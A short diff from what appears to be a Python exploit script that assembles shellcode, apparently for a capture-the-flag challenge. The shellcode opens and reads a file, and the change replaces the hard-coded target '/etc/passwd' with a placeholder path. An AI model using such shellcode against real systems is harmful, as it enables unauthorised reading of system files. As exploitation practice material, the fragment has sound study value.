@@ -44,6 +44,6 @@ read:
 
 setra:
 	call open
-	.string	"/etc/passwd"
+	.string	"file_path"
 '''
 print (asm(sc))[:-1]+'\x00'
